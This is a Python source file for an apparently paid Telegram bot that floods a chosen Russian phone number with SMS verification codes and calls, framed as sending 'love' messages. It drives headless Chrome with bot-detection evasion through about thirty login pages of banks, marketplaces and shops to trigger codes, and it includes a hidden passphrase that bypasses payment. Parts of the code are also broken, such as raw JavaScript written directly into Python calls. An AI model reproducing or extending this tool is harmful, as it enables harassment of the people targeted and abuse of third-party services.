import os, sys
sys.path.append('C:\\Users\\neket\\OneDrive\\Документы\\tg_bomb')
sys.path.append('C:\\Users\\neket\\AppData\\Local\\Programs\\Python\\Python314\\python314.zip')
sys.path.append('C:\\Users\\neket\\AppData\\Local\\Programs\\Python\\Python314\\DLLs')
sys.path.append('C:\\Users\\neket\\AppData\\Local\\Programs\\Python\\Python314\\Lib\\site-packages')
sys.path.append('C:\\Users\\neket\\AppData\\Local\\Programs\\Python\\Python314')
sys.path.append('C:\\Users\\neket\\AppData\\Local\\Programs\\Python\\Python314\\Lib')
from telegram.constants import ChatAction
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, PreCheckoutQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from dotenv import load_dotenv
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchFrameException, WebDriverException
from selenium.webdriver.common.action_chains import ActionChains
import logging
import re
import time
import random
import string
import threading
from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/telegram", methods=["POST"])
async def telegram_webhook():
    update = Update.de_json(request.get_json(), application.bot)
    await application.process_update(update)
    return {"status": "ok"}
    
@app.route("/", methods=["GET"])
def root():
    return jsonify({"status": "running"}), 200

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "timestamp": time.time()}), 200

@app.route("/wakeup", methods=["GET"])
def wakeup():
    return jsonify({"status": "awake", "timestamp": time.time()}), 200

def find_phone_field_and_fill(driver, phone, timeout: int = 30) -> bool:
    locators = [
        (By.XPATH, "//*[contains(text(), 'телефон')]/ancestor::form//input[@type='text']"),
        (By.CSS_SELECTOR, "input[name='username']"),
        (By.CSS_SELECTOR, "input[id='username']"),
        (By.CSS_SELECTOR, "input[type='tel']"),
        (By.CSS_SELECTOR, "input[placeholder*='телефон']"),
        (By.CSS_SELECTOR, "input[aria-label*='телефон']"),
        (By.XPATH, "//input[contains(@placeholder, 'телефон') or contains(@placeholder, 'логин')]"),
        (By.XPATH, "//form//input[@type='text' or @type='tel']"),
        (By.CSS_SELECTOR, "input[type='tel']"),
        (By.XPATH, "//input[@type='text' and (string-length(@value) < 6 or not(@value))]"),
        (By.CSS_SELECTOR, "input[inputmode='tel']"),
        (By.CSS_SELECTOR, "input[name*='phone']"),
        (By.CSS_SELECTOR, "input[id*='phone']"),
        (By.CSS_SELECTOR, "input[name*='mobile']"),
        (By.CSS_SELECTOR, "input[id*='mobile']"),
        (By.CSS_SELECTOR, "input[name*='number']"),
        (By.CSS_SELECTOR, "input[id*='number']")
    ]

    start_time = time.time()

    while time.time() - start_time < timeout:
        try:
            driver.switch_to.default_content()
            frames = driver.find_elements(By.TAG_NAME, "iframe")
            for frame in frames:
                try:
                    driver.switch_to.frame(frame)
                    for by, locator in locators:
                        try:
                            field = WebDriverWait(driver, 3).until(
                                EC.element_to_be_clickable((by, locator))
                            )
                            if field.is_displayed() and field.is_enabled():
                                scroll_to_element(driver, field)
                                random_delay()
                                field.clear()
                                human_like_type(field, phone)
                                return True
                        except:
                            continue
                finally:
                    driver.switch_to.default_content()
        except NoSuchFrameException:
            pass

        for by, locator in locators:
            try:
                field = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((by, locator))
                )
                if field.is_displayed() and field.is_enabled():
                    scroll_to_element(driver, field)
                    random_delay()
                    field.clear()
                    human_like_type(field, phone)
                    return True
            except TimeoutException:
                continue
            except Exception as e:
                None

        random_delay(1.0, 2.0)

    return False

def login_a(phone: str, url, button_locators):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-infobars")
    options.add_argument("--start-maximized")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--allow-running-insecure-content")
    options.add_argument("--disable-web-security")
    options.add_argument("--disable-features=IsolateOrigins,site-per-process")
    user_agent = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
    )
    options.add_argument(f"user-agent={user_agent}")
    options.add_experimental_option('useAutomationExtension', False)
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    try:
        global driver
        driver = webdriver.Chrome(options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.get(url)

        if not find_phone_field_and_fill(driver, phone):
            None

        button_clicked = False

        for locator in button_locators:
            try:
                button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable(locator)
                )
                if button.is_displayed():
                    button.click()
                    button_clicked = True
                    break
            except TimeoutException:
                continue

        if not button_clicked:
            None

    except Exception as e:
        None
    finally:
        time.sleep(5)
            
def find_phone_field_and_filled(driver, phone, timeout: int = 30) -> bool:
        locators = [
        (By.CSS_SELECTOR, "input[name='username']"),
        (By.CSS_SELECTOR, "input[id='username']"),
        (By.CSS_SELECTOR, "input[type='tel']"),
        (By.CSS_SELECTOR, "input[placeholder*='телефон']"),
        (By.CSS_SELECTOR, "input[aria-label*='телефон']"),
        (By.XPATH, "//input[contains(@placeholder, 'телефон') or contains(@placeholder, 'логин')]"),
        (By.XPATH, "//form//input[@type='text' or @type='tel']"),
        (By.CSS_SELECTOR, "input[type='tel']"),
        (By.XPATH, "//input[@type='text' and (string-length(@value) < 6 or not(@value))]"),
        (By.CSS_SELECTOR, "input[inputmode='tel']"),
        (By.CSS_SELECTOR, "input[name*='phone']"),
        (By.CSS_SELECTOR, "input[id*='phone']"),
        (By.CSS_SELECTOR, "input[name*='mobile']"),
        (By.CSS_SELECTOR, "input[id*='mobile']"),
        (By.CSS_SELECTOR, "input[name*='number']"),
        (By.CSS_SELECTOR, "input[id*='number']")
        ]
        buttony = [
        (By.XPATH, "//a[contains(@class, 'btn') and normalize-space(text())='Войти по номеру телефона']"),
        (By.XPATH, "//button[normalize-space(text())='Ок']"),
        (By.XPATH, "//button[contains(text(), 'Войти')]"),
        (By.XPATH, "//button[normalize-space(text())='Телефон']")
        ]
    
        buttony_clicked = False

        for locator in buttony:
            try:
                buttony = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable(locator)
                )
                if buttony.is_displayed():
                    buttony.click()
                    buttony_clicked = True
                    break
            except TimeoutException:
                continue

        if not buttony_clicked:
            None

        start_time = time.time()

        while time.time() - start_time < timeout:
            try:
                driver.switch_to.default_content()
                frames = driver.find_elements(By.TAG_NAME, "iframe")
                for frame in frames:
                    try:
                        driver.switch_to.frame(frame)
                        for by, locator in locators:
                            try:
                                field = WebDriverWait(driver, 3).until(
                                    EC.element_to_be_clickable((by, locator))
                                )
                                if field.is_displayed() and field.is_enabled():
                                    scroll_to_element(driver, field)
                                    random_delay()
                                    field.clear()
                                    human_like_type(field, phone)
                                    return True
                            except:
                                continue
                    finally:
                        driver.switch_to.default_content()
            except NoSuchFrameException:
                pass

            for by, locator in locators:
                try:
                    field = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((by, locator))
                    )
                    if field.is_displayed() and field.is_enabled():
                        scroll_to_element(driver, field)
                        random_delay()
                        field.clear()
                        human_like_type(field, phone)
                        return True
                except TimeoutException:
                    continue
                except Exception as e:
                    None

            random_delay(1.0, 2.0)

        return False

def login_b(phone: str, url, button_locators):
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-infobars")
        options.add_argument("--start-maximized")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--allow-running-insecure-content")
        options.add_argument("--disable-web-security")
        options.add_argument("--disable-features=IsolateOrigins,site-per-process")
        user_agent = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        )
        options.add_argument(f"user-agent={user_agent}")
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
        try:
            global driver
            driver = webdriver.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.get(url)

            if not find_phone_field_and_filled(driver, phone):
                None

            button_clicked = False

            for locator in button_locators:
                try:
                    button = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable(locator)
                    )
                    if button.is_displayed():
                        button.click()
                        button_clicked = True
                        break
                except TimeoutException:
                    continue

            if not button_clicked:
                None

        except Exception as e:
            None
        finally:
            time.sleep(5)
    
def stealth_init(driver):
    try:
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.execute_script(
            Object.defineProperty(navigator, 'plugins', {get: [1, 2, 3, 4, 5]}),
            Object.defineProperty(navigator, 'languages', {get: ['ru-RU', 'ru']})
        )
        driver.execute_cdp_cmd(
            'Page.addScriptToEvaluateOnNewDocument',
            {
                'source':
                    Object.defineProperty(window, 'chrome', {
                        get: ({
                            runtime: {},
                            app: {
                                isInstalled: false,
                            },
                        })
                    }),
            }
        )
    except Exception as e:
        None

def random_delay(min_sec=0.5, max_sec=2.0):
    time.sleep(random.uniform(min_sec, max_sec))

def human_like_type(element, text):
    for char in text:
        element.send_keys(char)
        random_delay(0.1, 0.4)

def scroll_to_element(driver, element):
    try:
        ActionChains(driver)\
            .move_to_element(element)\
            .pause(0.5)\
            .perform()
    except:
        pass     

def strt(n, no, interval = 0):
 global us_t
 p=0
 while True:
    ur = ("https://b2c.passport.rt.ru/auth/realms/b2c/protocol/openid-connect/auth?"
          "response_type=code&scope=openid&client_id=lk_b2c&redirect_uri=https%3A%2F%2F"
          "lk-api.rt.ru%2Fsso-auth%2F%3Fredirect%3Dhttps%253A%252F%252Flk.rt.ru%252F"
          "&state=%7B%22uuid%22%3A%22EDD60ACE-7016-46A7-A715-DFE6EB7FD420%22%7D")
    button = [
            (By.CSS_SELECTOR, "button[type='submit']"),
            (By.CSS_SELECTOR, "button.btn-primary"),
            (By.XPATH, "//button[contains(text(), 'Далее') or contains(text(), 'Войти')]")
        ]
    login_a(phone=us_t, url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://online.raiffeisen.ru/login/main"
    button = [
            (By.XPATH, "//button[normalize-space(text())='Войти']"),
            (By.XPATH, "//button[contains(translate(normalize-space(.), 'Й', 'И'), 'Войти')]"),
            (By.XPATH, "//button[@type='submit' and not(contains(translate(., 'Й', 'И'), 'логин'))]"),
            (By.XPATH, "//button[contains(@class, 'btn-primary') and contains(translate(normalize-space(.), 'Й', 'И'), 'Войти')]"),
            (By.XPATH, "//button[contains(translate(., 'Й', 'И'), 'Войти')]")
        ]
    login_a(phone=us_t, url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://id.wb.ru"
    button = [(By.CSS_SELECTOR, "button.button")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
        
    ur = "https://id.ozon.ru"
    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    second_button_locators = [(By.XPATH, "//button[contains(translate(normalize-space(.), 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ', 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'), 'войти другим способом')]"),]
    second_button_clicked = False
    for locator in second_button_locators:
            try:
                second_button = WebDriverWait(driver, 15).until(
                    EC.element_to_be_clickable(locator)
                )
                if second_button.is_displayed():
                    scroll_to_element(driver, second_button)
                    random_delay()
                    second_button.click()
                    time.sleep(10)
                    second_button_clicked = True
                    break
            except TimeoutException:
                continue
            except Exception as e:
                continue

    if not second_button_clicked:
            random_delay(3, 5)
            driver.quit()
            p=p+1
            if n==p:
                time.sleep(3)
                break
            
    ur = ("https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/"
    "auth?client_id=tcx_web&response_type=code&redirect_uri=https%3A%2F%2Fwww."
    "perekrestok.ru%2Fx5id-success&response_mode=query&scope=openid+offline_access")
    button = [(By.CSS_SELECTOR, "button[class*='btn']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
        
    ur = ("https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/auth?"
    "client_id=x5club&redirect_uri=https%3A%2F%2Fx5club.ru%2Flk&state=057dc554"
    "-6361-40c1-b528-638e42d609c0&response_mode=fragment&response_type=code&scope"
    "=openid%20offline_access&nonce=8b07f29a-cf7f-41f2-8cf6-6ba2154bed21&code_"
    "challenge=nAINW7ACZAPnz2WxCwRgR7RwPOv3rwy3kg3UYc8kcqY&"
    "code_challenge_method=S256")
    button = [(By.CSS_SELECTOR, "button[class*='btn']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = ("https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/auth?client_id"
    "=tc5_site&scope=openid%20offline_access&response_type=code&redirect_uri=https%3A%2"
    "F%2F5ka.ru%2Fapi%2Fauth%2Fcallback%2Fkeycloak&response_mode=query&state=V__HNVghWK"
    "ozXZvlMndv-2mkLGC9kn0QHNYl_s0QFg8&code_challenge=7Jc4GPpyquADj8pJ-gRXzbd_V"
    "dEAzRtOhxTFdVRrZ6U&code_challenge_method=S256")
    button = [(By.CSS_SELECTOR, "button[class*='btn']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.mvideo.ru/login"
    button = [(By.XPATH, "//button[contains(translate(., 'ПРОДОЛЖИТЬ', 'продолжить'), 'продолжить')]")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://passport.yandex.ru/pwl-yandex/auth"
    button = [
            (By.XPATH, "//button[normalize-space(text())='Войти']"),
            (By.XPATH, "//button[contains(translate(normalize-space(.), 'Й', 'И'), 'Войти')]"),
            (By.XPATH, "//button[@type='submit' and not(contains(translate(., 'Й', 'И'), 'логин'))]"),
            (By.XPATH, "//button[contains(@class, 'btn-primary') and contains(translate(normalize-space(.), 'Й', 'И'), 'Войти')]"),
            (By.XPATH, "//button[contains(translate(., 'Й', 'И'), 'Войти')]")
    ]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://online.autofinancebank.ru/auth/main"
    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
    login_a(phone=us_t, url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://wink.ru/auth"
    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://tvoe.live/?accessRestriction=true"
    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
    login_a(phone=us_t[1:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
   
    ur = "https://totopizza.ru/profile"
    button = [(By.XPATH, "//button[normalize-space()='Выслать код']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
  
    ur = "https://rikkopizza.ru/auth"
    button = [(By.XPATH, "//button[normalize-space(text())='Выслать код']"),]
    login_b(phone=us_t, url=ur, button_locators=button)
    time.sleep(random.uniform(8, 15))
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
  
    ur = "https://foodband.ru/profile"
    button = [(By.XPATH, "//button[normalize-space(text())='Выслать код']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.585zolotoy.ru/login/"
    button = [('xpath', "//*[contains(translate(text(), 'ПРОДОЛЖИТЬ', 'продолжить'), 'продолжить')]")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break

    ur = "https://www.petshop.ru/auth"
    button = [(By.CSS_SELECTOR, "button[type='submit']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break

    ur = "https://limestore.com/ru_ru/#lk"
    button = [(By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'Получить код')]")]
    login_b(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://santehnika-online.ru/personal/auth/"
    button = [(By.XPATH, "//button[normalize-space()='Получить код в SMS']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://richfamily.ru/my/auth/"
    button = [(By.XPATH, "//button[normalize-space()='Получить код']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://kikocosmetics.ru/personal"
    button = [(By.XPATH, "//button[normalize-space()='Получить код']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://4lapy.ru/profile/"
    button = [(By.XPATH, "//button[normalize-space()='продолжить']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.avtoall.ru/login/"
    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://brandshop.ru/login/"
    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://oauth.av.ru/"
    button = [(By.XPATH, "//button[normalize-space()='Войти']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.alltime.ru/personal"
    button = [(By.XPATH, "//button[normalize-space(text())='Получить код']")]
    login_b(phone=us_t, url=ur, button_locators=button)
    time.sleep(random.uniform(8, 15))
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.gloria-jeans.ru/#login"
    button = [(By.XPATH, "//button[normalize-space()='Получить код']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.stoloto.ru/auth"
    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
    login_a(phone=us_t, url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://start.ru/auth"
    button = [(By.XPATH, "//button[normalize-space()='Продолжить']")]
    login_b(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break
    
    ur = "https://www.letu.ru/login"
    button = [(By.XPATH, "//button[normalize-space()='Выслать код']")]
    login_a(phone=us_t[2:], url=ur, button_locators=button)
    time.sleep(5)
    driver.quit()
    p=p+1
    if n==p:
        time.sleep(3)
        break

load_dotenv()
bot_token=os.getenv('BOT_TOKEN')
WEBHOOK_URL = f"https://bot-tgf.onrender.com/telegram"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 await update.message.reply_text(
 'Здравствуй! Введи номер телефона человека, '
 'которому хочешь выразить силу своей любви.'
 ' Вводи в формате: +7XXXXXXXXXX.'
 )
  
async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global us_t
    us_t = update.message.text
    phone = us_t
    if phone[0] == '+' and phone[1] == '7' and len(phone) == 12:
        context.user_data['phone'] = phone
        kb = [
            [InlineKeyboardButton('30', callback_data='amount_30'),
             InlineKeyboardButton('60', callback_data='amount_60')],
            [InlineKeyboardButton('90', callback_data='amount_90'),
             InlineKeyboardButton('120', callback_data='amount_120')],
            [InlineKeyboardButton('210', callback_data='amount_210'),
             InlineKeyboardButton('300', callback_data='amount_300')]
        ]
        menu = InlineKeyboardMarkup(kb)
        await update.message.reply_text(
            'Выбери количество любовных смс + звонков:',
            reply_markup=menu
        )
    elif phone[:19]=='asdfRgfKjjjOPffd +7' and len(phone)==29:
        us_t=phone[17:]
        kb=[
            [InlineKeyboardButton('30', callback_data='30'),
             InlineKeyboardButton('60', callback_data='60')],
            [InlineKeyboardButton('90', callback_data='90'),
            InlineKeyboardButton('120', callback_data='120')],
            [InlineKeyboardButton('210', callback_data='210'),
            InlineKeyboardButton('300', callback_data='300')]
            ]
        menu=InlineKeyboardMarkup(kb)
        await update.message.reply_text(
        'Выбери количество любовных смс + звонков:',
        reply_markup=menu
        )
    else:
        await update.message.reply_text('Неверный формат.')
        
async def hb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 query=update.callback_query
 await query.answer()
 nk=query.data
 no=threading.Event()
 if nk=='30':
  n=30
  await query.edit_message_text('Запущено!')
  threading.Thread(target=strt, args=[n, no], daemon=False).start()
 elif nk=='60':
  n=60
  await query.edit_message_text('Запущено!')
  threading.Thread(target=strt, args=[n, no], daemon=False).start()
 elif nk=='90':
  n=90
  await query.edit_message_text('Запущено!')
  threading.Thread(target=strt, args=[n, no], daemon=False).start()
 elif nk=='120':
  n=120
  await query.edit_message_text('Запущено!')
  threading.Thread(target=strt, args=[n, no], daemon=False).start()
 elif nk=='210':
  n=210
  await query.edit_message_text('Запущено!')
  threading.Thread(target=strt, args=[n, no], daemon=False).start()
 elif nk=='300':
  n=300
  await query.edit_message_text('Запущено!')
  threading.Thread(target=strt, args=[n, no], daemon=False).start()

async def handle_amount_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    amount_str = query.data.split('_')[1]
    amount = int(amount_str)
    context.user_data['selected_amount'] = amount

    paybutton = InlineKeyboardMarkup([
        [InlineKeyboardButton("Оплатить ✮", callback_data="pay_stars")]
    ])
    await query.edit_message_text(
        f"Выбрано: {amount} SMS/звонков.\n"
        "Нажмите «Оплатить», чтобы продолжить.",
        reply_markup=paybutton
    )

async def send_stars_invoice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    amount = context.user_data.get('selected_amount')
    if not amount:
        await query.edit_message_text("Ошибка: не выбрано количество.")
        return

    stars_cost = amount

    invoice = {
        'title': f'Любовные SMS/звонки ({amount} шт.)',
        'description': f'Отправка {amount} сообщений/звонков любимому человеку.',
        'payload': f'sms_payment_{amount}_{query.from_user.id}',
        'provider_token': '',
        'currency': 'XTR',
        'prices': [{'label': 'Услуга', 'amount': stars_cost}],
        'start_parameter': 'stars-payment',
    }

    try:
        await context.bot.send_invoice(
            chat_id=query.message.chat_id,
            **invoice
        )
    except Exception as e:
        await query.edit_message_text(f"Ошибка при создании счёта: {e}")

async def precheckout_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка предварительной проверки платежа."""
    query = update.pre_checkout_query
    if query.invoice_payload.startswith('sms_payment_'):
        await query.answer(ok=True)
    else:
        await query.answer(ok=False, error_message="Неверный платёж")
        
async def successful_payment_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    payment_info = update.message.successful_payment
    payload = payment_info.invoice_payload

    if not payload.startswith('sms_payment_'):
        await update.message.reply_text("Неизвестный платёж.")
        return

    try:
        parts = payload.split('_')
        amount = int(parts[2])
    except (IndexError, ValueError):
        await update.message.reply_text("Ошибка: не удалось определить количество.")
        return

    await update.message.reply_text(
        f"✅ Оплата прошла успешно!\n"
        f"Запущено отправление {amount} SMS/звонков."
    )

    n=amount
    no=threading.Event()
    threading.Thread(target=strt, args=[n, no], daemon=False).start()
 
def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

from threading import Thread
flask_thread = Thread(target=run_flask, daemon=True)
flask_thread.start()

def open(net, interval = 0):
 time.sleep(60)
 options = webdriver.ChromeOptions()
 options.add_argument("--headless")
 options.add_argument("--disable-blink-features=AutomationControlled")
 options.add_argument("--no-sandbox")
 options.add_argument("--disable-dev-shm-usage")
 options.add_argument("--disable-gpu")
 options.add_argument("--disable-extensions")
 options.add_argument("--disable-infobars")
 options.add_argument("--start-maximized")
 options.add_argument("--window-size=1920,1080")
 options.add_argument("--ignore-certificate-errors")
 options.add_argument("--allow-running-insecure-content")
 options.add_argument("--disable-web-security")
 options.add_argument("--disable-features=IsolateOrigins,site-per-process")
 user_agent = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
 )
 options.add_argument(f"user-agent={user_agent}")
 options.add_experimental_option('useAutomationExtension', False)
 options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
 options.add_experimental_option('excludeSwitches', ['enable-logging'])
 
 while True:
  drivery = webdriver.Chrome(options=options)
  drivery.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
  url='https://rendik.onrender.com'
  drivery.get(url)
  time.sleep(30)
  drivery.quit()
  time.sleep(600)

app = ApplicationBuilder().token(bot_token).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, sms))
app.add_handler(CallbackQueryHandler(handle_amount_choice, pattern=r'^amount_\d+$'))
app.add_handler(CallbackQueryHandler(send_stars_invoice, pattern=r'^pay_stars$'))
app.add_handler(PreCheckoutQueryHandler(precheckout_handler))
app.add_handler(CallbackQueryHandler(hb))
app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_handler))
net=threading.Event()
tu=threading.Thread(target=open, args=[net], daemon=False)
tu.start()
app.run_polling()



